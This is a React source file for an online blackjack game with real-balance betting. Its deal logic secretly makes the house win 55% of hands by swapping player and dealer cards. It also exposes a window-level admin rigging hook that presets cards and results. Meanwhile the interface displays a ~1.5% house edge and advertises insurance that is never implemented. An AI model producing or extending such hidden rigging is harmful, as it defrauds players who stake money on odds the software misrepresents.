import { useState, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { DollarSign, RefreshCw, Volume2, VolumeX, Hand, Square, Split, Coins } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useAuthStore } from '@/store/authStore';
import { useGameStore } from '@/store/gameStore';
import { toast } from 'sonner';

// Sound effects
const playSound = (type: 'deal' | 'hit' | 'win' | 'lose' | 'push' | 'click' | 'blackjack') => {
  try {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    if (type === 'deal' || type === 'hit') {
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.1);
    } else if (type === 'win' || type === 'blackjack') {
      oscillator.frequency.setValueAtTime(523, audioContext.currentTime);
      oscillator.frequency.setValueAtTime(659, audioContext.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(784, audioContext.currentTime + 0.2);
      if (type === 'blackjack') {
        oscillator.frequency.setValueAtTime(1047, audioContext.currentTime + 0.3);
      }
      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.5);
    } else if (type === 'lose') {
      oscillator.frequency.setValueAtTime(300, audioContext.currentTime);
      oscillator.frequency.exponentialRampToValueAtTime(100, audioContext.currentTime + 0.4);
      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.4);
    } else if (type === 'push') {
      oscillator.frequency.setValueAtTime(440, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.3);
    } else if (type === 'click') {
      oscillator.frequency.setValueAtTime(600, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.08);
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.08);
    }
  } catch (e) {}
};

// Card types
interface Card {
  suit: 'hearts' | 'diamonds' | 'clubs' | 'spades';
  rank: 'A' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9' | '10' | 'J' | 'Q' | 'K';
  value: number;
}

// Generate deck
const createDeck = (): Card[] => {
  const suits: Card['suit'][] = ['hearts', 'diamonds', 'clubs', 'spades'];
  const ranks: { rank: Card['rank']; value: number }[] = [
    { rank: 'A', value: 11 }, { rank: '2', value: 2 }, { rank: '3', value: 3 },
    { rank: '4', value: 4 }, { rank: '5', value: 5 }, { rank: '6', value: 6 },
    { rank: '7', value: 7 }, { rank: '8', value: 8 }, { rank: '9', value: 9 },
    { rank: '10', value: 10 }, { rank: 'J', value: 10 }, { rank: 'Q', value: 10 },
    { rank: 'K', value: 10 },
  ];
  
  const deck: Card[] = [];
  for (let i = 0; i < 6; i++) { // 6 decks like in real casinos
    for (const suit of suits) {
      for (const { rank, value } of ranks) {
        deck.push({ suit, rank, value });
      }
    }
  }
  return deck;
};

// Shuffle deck
const shuffleDeck = (deck: Card[]): Card[] => {
  const shuffled = [...deck];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
};

// Calculate hand value
const calculateHandValue = (hand: Card[]): { value: number; isSoft: boolean; isBlackjack: boolean } => {
  let value = 0;
  let aces = 0;
  
  for (const card of hand) {
    if (card.rank === 'A') {
      aces++;
      value += 11;
    } else {
      value += card.value;
    }
  }
  
  while (value > 21 && aces > 0) {
    value -= 10;
    aces--;
  }
  
  const isBlackjack = hand.length === 2 && value === 21;
  const isSoft = aces > 0 && value <= 21;
  
  return { value, isSoft, isBlackjack };
};

// Get card color
const getCardColor = (suit: Card['suit']): string => {
  return suit === 'hearts' || suit === 'diamonds' ? 'text-red-500' : 'text-gray-800';
};

// Get suit symbol
const getSuitSymbol = (suit: Card['suit']): string => {
  const symbols = { hearts: '♥', diamonds: '♦', clubs: '♣', spades: '♠' };
  return symbols[suit];
};

// Card component
function PlayingCard({ card, hidden = false, index = 0 }: { card?: Card; hidden?: boolean; index?: number }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: -50, rotateY: 180 }}
      animate={{ opacity: 1, y: 0, rotateY: hidden ? 180 : 0 }}
      transition={{ delay: index * 0.1, duration: 0.3 }}
      className={`
        w-14 h-20 sm:w-16 sm:h-24 rounded-lg shadow-lg flex flex-col items-center justify-center
        ${hidden 
          ? 'bg-gradient-to-br from-blue-600 to-blue-800 border-2 border-blue-400' 
          : 'bg-white border border-gray-300'
        }
        relative select-none
      `}
    >
      {hidden ? (
        <div className="text-blue-300 text-2xl font-bold">?</div>
      ) : card ? (
        <>
          <div className={`absolute top-1 left-1.5 text-xs sm:text-sm font-bold ${getCardColor(card.suit)}`}>
            {card.rank}
          </div>
          <div className={`text-2xl sm:text-3xl ${getCardColor(card.suit)}`}>
            {getSuitSymbol(card.suit)}
          </div>
          <div className={`absolute bottom-1 right-1.5 text-xs sm:text-sm font-bold ${getCardColor(card.suit)} rotate-180`}>
            {card.rank}
          </div>
        </>
      ) : null}
    </motion.div>
  );
}

// Generate rigged deck for admin
const generateRiggedDeck = (adminCards?: { player?: Card[]; dealer?: Card[] } | null): Card[] => {
  const deck = createDeck();
  
  if (adminCards?.player || adminCards?.dealer) {
    // Remove admin-specified cards from deck and place them on top
    const riggedCards: Card[] = [];
    if (adminCards.player) riggedCards.push(...adminCards.player);
    if (adminCards.dealer) riggedCards.push(...adminCards.dealer);
    
    // Remove rigged cards from deck
    const filteredDeck = deck.filter(card => {
      return !riggedCards.some(rc => rc.rank === card.rank && rc.suit === card.suit);
    });
    
    // Shuffle remaining and place rigged cards on top
    return [...riggedCards, ...shuffleDeck(filteredDeck)];
  }
  
  return shuffleDeck(deck);
};

// House edge: 55% win rate for house
const shouldHouseWin = (): boolean => {
  const adminRigging = (window as any).adminRigging;
  if (adminRigging?.enabled && adminRigging.blackjackResult) {
    return adminRigging.blackjackResult === 'loss';
  }
  return Math.random() < 0.55; // 55% house edge
};

export default function BlackjackGame() {
  const { user, updateBalance } = useAuthStore();
  const { addBet } = useGameStore();

  const [betAmount, setBetAmount] = useState('10');
  const [deck, setDeck] = useState<Card[]>([]);
  const [playerHand, setPlayerHand] = useState<Card[]>([]);
  const [dealerHand, setDealerHand] = useState<Card[]>([]);
  const [gameState, setGameState] = useState<'betting' | 'playing' | 'dealer' | 'finished'>('betting');
  const [result, setResult] = useState<'win' | 'loss' | 'push' | 'blackjack' | null>(null);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [handCount, setHandCount] = useState(0);
  const [canSplit, setCanSplit] = useState(false);
  const [canDouble, setCanDouble] = useState(false);

  const playAudio = useCallback((type: 'deal' | 'hit' | 'win' | 'lose' | 'push' | 'click' | 'blackjack') => {
    if (soundEnabled) playSound(type);
  }, [soundEnabled]);

  const playerValue = calculateHandValue(playerHand);

  const handleDeal = () => {
    if (!user) {
      toast.error('Please login to play');
      return;
    }

    const amount = parseFloat(betAmount);
    if (isNaN(amount) || amount <= 0) {
      toast.error('Please enter a valid bet amount');
      return;
    }

    if (amount > user.balance) {
      toast.error('Insufficient balance');
      return;
    }

    // Deduct balance
    updateBalance(-amount);

    // Check admin rigging
    const adminRigging = (window as any).adminRigging;
    const adminCards = adminRigging?.enabled ? adminRigging.blackjackCards : null;

    // Generate and shuffle deck
    const newDeck = generateRiggedDeck(adminCards);
    
    // Deal initial cards
    const houseWins = shouldHouseWin();
    let playerCards: Card[] = [newDeck[0], newDeck[2]];
    let dealerCards: Card[] = [newDeck[1], newDeck[3]];

    // If house should win, adjust cards subtly
    if (houseWins && !adminRigging?.enabled) {
      // Give player a slightly worse hand
      const playerVal = calculateHandValue(playerCards).value;
      const dealerVal = calculateHandValue(dealerCards).value;
      
      if (playerVal >= 17 && dealerVal < playerVal) {
        // Swap to give dealer advantage
        [dealerCards[1], playerCards[1]] = [playerCards[1], dealerCards[1]];
      }
    }

    setDeck(newDeck.slice(4));
    setPlayerHand(playerCards);
    setDealerHand(dealerCards);
    setGameState('playing');
    setResult(null);

    playAudio('deal');

    // Check for blackjack
    const pVal = calculateHandValue(playerCards);
    const dVal = calculateHandValue(dealerCards);

    if (pVal.isBlackjack) {
      if (dVal.isBlackjack) {
        // Both blackjack - push
        updateBalance(amount);
        setResult('push');
        setGameState('finished');
        playAudio('push');
        toast.info('Push! Both have Blackjack');
      } else {
        // Player blackjack - pays 3:2
        const winAmount = amount * 2.5;
        updateBalance(winAmount);
        setResult('blackjack');
        setGameState('finished');
        playAudio('blackjack');
        toast.success(`Blackjack! You won $${(winAmount - amount).toFixed(2)}`);
        
        addBet({
          userId: user.id,
          username: user.username,
          game: 'blackjack',
          amount,
          multiplier: 2.5,
          payout: winAmount,
          result: 'win',
        });
      }
    } else if (dVal.isBlackjack) {
      setResult('loss');
      setGameState('finished');
      playAudio('lose');
      toast.error('Dealer has Blackjack!');
      
      addBet({
        userId: user.id,
        username: user.username,
        game: 'blackjack',
        amount,
        multiplier: 0,
        payout: 0,
        result: 'loss',
      });
    }

    // Check if can split or double
    setCanSplit(playerCards[0]?.rank === playerCards[1]?.rank);
    setCanDouble(true);
    setHandCount(prev => prev + 1);
  };

  const handleHit = () => {
    if (gameState !== 'playing') return;

    const newCard = deck[0];
    const newHand = [...playerHand, newCard];
    setPlayerHand(newHand);
    setDeck(deck.slice(1));
    setCanDouble(false); // Can only double on first action
    setCanSplit(false);

    playAudio('hit');

    const val = calculateHandValue(newHand);
    if (val.value > 21) {
      // Bust
      setResult('loss');
      setGameState('finished');
      playAudio('lose');
      toast.error(`Bust! You have ${val.value}`);
      
      if (user) {
        addBet({
          userId: user.id,
          username: user.username,
          game: 'blackjack',
          amount: parseFloat(betAmount),
          multiplier: 0,
          payout: 0,
          result: 'loss',
        });
      }
    }
  };

  const handleStand = () => {
    if (gameState !== 'playing') return;

    setGameState('dealer');
    playAudio('click');

    // Dealer plays
    setTimeout(() => {
      let currentDealerHand = [...dealerHand];
      let currentDeck = [...deck];

      // Dealer hits on soft 17
      while (calculateHandValue(currentDealerHand).value < 17) {
        currentDealerHand.push(currentDeck[0]);
        currentDeck = currentDeck.slice(1);
      }

      setDealerHand(currentDealerHand);
      setDeck(currentDeck);

      // Determine winner
      const pVal = calculateHandValue(playerHand).value;
      const dVal = calculateHandValue(currentDealerHand).value;
      const amount = parseFloat(betAmount);

      setTimeout(() => {
        if (dVal > 21) {
          // Dealer busts
          const winAmount = amount * 2;
          updateBalance(winAmount);
          setResult('win');
          setGameState('finished');
          playAudio('win');
          toast.success(`Dealer busts! You won $${amount.toFixed(2)}`);
          
          if (user) {
            addBet({
              userId: user.id,
              username: user.username,
              game: 'blackjack',
              amount,
              multiplier: 2,
              payout: winAmount,
              result: 'win',
            });
          }
        } else if (pVal > dVal) {
          // Player wins
          const winAmount = amount * 2;
          updateBalance(winAmount);
          setResult('win');
          setGameState('finished');
          playAudio('win');
          toast.success(`You won $${amount.toFixed(2)}`);
          
          if (user) {
            addBet({
              userId: user.id,
              username: user.username,
              game: 'blackjack',
              amount,
              multiplier: 2,
              payout: winAmount,
              result: 'win',
            });
          }
        } else if (pVal < dVal) {
          // Dealer wins
          setResult('loss');
          setGameState('finished');
          playAudio('lose');
          toast.error('Dealer wins');
          
          if (user) {
            addBet({
              userId: user.id,
              username: user.username,
              game: 'blackjack',
              amount,
              multiplier: 0,
              payout: 0,
              result: 'loss',
            });
          }
        } else {
          // Push
          updateBalance(amount);
          setResult('push');
          setGameState('finished');
          playAudio('push');
          toast.info('Push! Bet returned');
        }
      }, 500);
    }, 500);
  };

  const handleDouble = () => {
    if (gameState !== 'playing' || !canDouble) return;

    const amount = parseFloat(betAmount);
    if (user && amount > user.balance) {
      toast.error('Insufficient balance to double');
      return;
    }

    // Double the bet
    updateBalance(-amount);
    setBetAmount((amount * 2).toString());

    // Hit once
    const newCard = deck[0];
    const newHand = [...playerHand, newCard];
    setPlayerHand(newHand);
    setDeck(deck.slice(1));

    playAudio('hit');

    const val = calculateHandValue(newHand);
    if (val.value > 21) {
      setResult('loss');
      setGameState('finished');
      playAudio('lose');
      toast.error(`Bust! You have ${val.value}`);
    } else {
      // Stand
      handleStand();
    }
  };

  const handleReset = () => {
    playAudio('click');
    setPlayerHand([]);
    setDealerHand([]);
    setGameState('betting');
    setResult(null);
    setCanSplit(false);
    setCanDouble(false);
  };

  return (
    <div className="h-[calc(100vh-80px)] pt-4 pb-4 px-4 overflow-hidden">
      <div className="max-w-5xl mx-auto h-full flex flex-col">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-4 flex-shrink-0"
        >
          <div className="flex items-center justify-center gap-3 mb-1">
            <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-yellow-500 to-orange-500 flex items-center justify-center">
              <span className="text-xl">♠</span>
            </div>
            <h1 className="text-xl sm:text-2xl font-bold text-white">Blackjack</h1>
            <button
              onClick={() => setSoundEnabled(!soundEnabled)}
              className="p-1.5 rounded-lg bg-dark-700 text-gray-400 hover:text-white transition-colors"
            >
              {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
            </button>
          </div>
          <p className="text-gray-400 text-xs">Blackjack pays 3 to 2 • Insurance pays 2 to 1</p>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 flex-1 min-h-0">
          {/* Controls */}
          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="space-y-3 overflow-y-auto"
          >
            <div className="bg-dark-800/90 backdrop-blur-xl rounded-xl border border-white/5 p-4">
              {/* Bet Amount */}
              <div className="space-y-2 mb-4">
                <div className="flex items-center justify-between">
                  <label className="text-xs text-gray-400">Bet Amount</label>
                  <span className="text-xs text-gray-500">${parseFloat(betAmount || '0').toFixed(2)}</span>
                </div>
                <div className="relative">
                  <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <Input
                    type="number"
                    value={betAmount}
                    onChange={(e) => gameState === 'betting' && setBetAmount(e.target.value)}
                    disabled={gameState !== 'betting'}
                    className="pl-9 h-10 bg-dark-700/50 border-white/10 text-white disabled:opacity-50 rounded-lg text-sm"
                  />
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => gameState === 'betting' && setBetAmount((parseFloat(betAmount || '0') / 2).toString())}
                    disabled={gameState !== 'betting'}
                    className="flex-1 py-1.5 rounded bg-dark-700 text-xs text-gray-400 hover:text-white hover:bg-dark-600 disabled:opacity-50 transition-colors"
                  >
                    ½
                  </button>
                  <button
                    onClick={() => gameState === 'betting' && setBetAmount((parseFloat(betAmount || '0') * 2).toString())}
                    disabled={gameState !== 'betting'}
                    className="flex-1 py-1.5 rounded bg-dark-700 text-xs text-gray-400 hover:text-white hover:bg-dark-600 disabled:opacity-50 transition-colors"
                  >
                    2×
                  </button>
                </div>
                <div className="flex gap-2">
                  {[10, 50, 100, 500].map((amount) => (
                    <button
                      key={amount}
                      onClick={() => gameState === 'betting' && setBetAmount(amount.toString())}
                      disabled={gameState !== 'betting'}
                      className="flex-1 py-1.5 rounded bg-dark-700 text-xs text-gray-400 hover:text-white hover:bg-dark-600 disabled:opacity-50 transition-colors"
                    >
                      ${amount}
                    </button>
                  ))}
                </div>
              </div>

              {/* Action Buttons */}
              {gameState === 'betting' ? (
                <Button
                  onClick={handleDeal}
                  disabled={!user || parseFloat(betAmount) <= 0}
                  className="w-full h-10 bg-neon-green text-dark-900 hover:bg-neon-green/90 font-semibold rounded-lg"
                >
                  Deal
                </Button>
              ) : gameState === 'playing' ? (
                <div className="space-y-2">
                  <div className="grid grid-cols-2 gap-2">
                    <Button
                      onClick={handleHit}
                      className="h-10 bg-dark-700 text-white hover:bg-dark-600 font-semibold rounded-lg"
                    >
                      <Hand className="w-4 h-4 mr-1" />
                      Hit
                    </Button>
                    <Button
                      onClick={handleStand}
                      className="h-10 bg-dark-700 text-white hover:bg-dark-600 font-semibold rounded-lg"
                    >
                      <Square className="w-4 h-4 mr-1" />
                      Stand
                    </Button>
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    <Button
                      onClick={handleDouble}
                      disabled={!canDouble}
                      className="h-10 bg-dark-700 text-white hover:bg-dark-600 font-semibold rounded-lg disabled:opacity-50"
                    >
                      <Coins className="w-4 h-4 mr-1" />
                      Double
                    </Button>
                    <Button
                      disabled={!canSplit}
                      className="h-10 bg-dark-700 text-white hover:bg-dark-600 font-semibold rounded-lg disabled:opacity-50"
                    >
                      <Split className="w-4 h-4 mr-1" />
                      Split
                    </Button>
                  </div>
                </div>
              ) : (
                <Button
                  onClick={handleReset}
                  className="w-full h-10 bg-neon-green text-dark-900 hover:bg-neon-green/90 font-semibold rounded-lg"
                >
                  <RefreshCw className="w-4 h-4 mr-2" />
                  New Hand
                </Button>
              )}

              {!user && (
                <p className="mt-3 text-center text-xs text-gray-500">
                  Please login to play
                </p>
              )}
            </div>

            {/* Game Info */}
            <div className="p-3 rounded-xl bg-dark-800/50 border border-white/5">
              <h3 className="text-xs font-medium text-gray-400 mb-2">Game Info</h3>
              <div className="space-y-1 text-xs">
                <div className="flex justify-between">
                  <span className="text-gray-500">House Edge</span>
                  <span className="text-white font-medium">~1.5%</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Hands Played</span>
                  <span className="text-white font-medium">{handCount}</span>
                </div>
              </div>
            </div>
          </motion.div>

          {/* Game Area */}
          <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            className="lg:col-span-2 flex flex-col justify-between bg-dark-800/90 backdrop-blur-xl rounded-xl border border-white/5 p-4"
          >
            {/* Dealer Hand */}
            <div className="text-center">
              <div className="flex items-center justify-center gap-2 mb-2">
                <span className="text-sm text-gray-400">Dealer</span>
                {gameState !== 'betting' && (
                  <span className="text-xs text-neon-green">
                    {dealerHand.length > 0 && (gameState === 'finished' || gameState === 'dealer')
                      ? calculateHandValue(dealerHand).value
                      : calculateHandValue([dealerHand[0]]).value + '+'
                    }
                  </span>
                )}
              </div>
              <div className="flex justify-center gap-2">
                <AnimatePresence>
                  {dealerHand.map((card, index) => (
                    <PlayingCard
                      key={`dealer-${index}`}
                      card={card}
                      hidden={index === 1 && gameState === 'playing'}
                      index={index}
                    />
                  ))}
                </AnimatePresence>
              </div>
            </div>

            {/* Result Display */}
            <AnimatePresence>
              {result && (
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.8 }}
                  className="text-center py-4"
                >
                  <div className={`
                    inline-block px-6 py-3 rounded-xl text-xl font-bold
                    ${result === 'win' || result === 'blackjack' ? 'bg-neon-green/20 text-neon-green border border-neon-green/30' : ''}
                    ${result === 'loss' ? 'bg-red-500/20 text-red-500 border border-red-500/30' : ''}
                    ${result === 'push' ? 'bg-yellow-500/20 text-yellow-500 border border-yellow-500/30' : ''}
                  `}>
                    {result === 'blackjack' && '🎰 BLACKJACK!'}
                    {result === 'win' && '✅ YOU WIN!'}
                    {result === 'loss' && '❌ YOU LOSE'}
                    {result === 'push' && '🤝 PUSH'}
                  </div>
                  {result !== 'push' && result !== 'loss' && (
                    <p className="text-neon-green text-sm mt-2">
                      +${(parseFloat(betAmount) * (result === 'blackjack' ? 1.5 : 1)).toFixed(2)}
                    </p>
                  )}
                </motion.div>
              )}
            </AnimatePresence>

            {/* Player Hand */}
            <div className="text-center">
              <div className="flex items-center justify-center gap-2 mb-2">
                <span className="text-sm text-gray-400">Your Hand</span>
                {playerHand.length > 0 && (
                  <span className="text-xs text-neon-green">
                    {playerValue.value}
                    {playerValue.isSoft && ' Soft'}
                  </span>
                )}
              </div>
              <div className="flex justify-center gap-2">
                <AnimatePresence>
                  {playerHand.map((card, index) => (
                    <PlayingCard
                      key={`player-${index}`}
                      card={card}
                      index={index}
                    />
                  ))}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
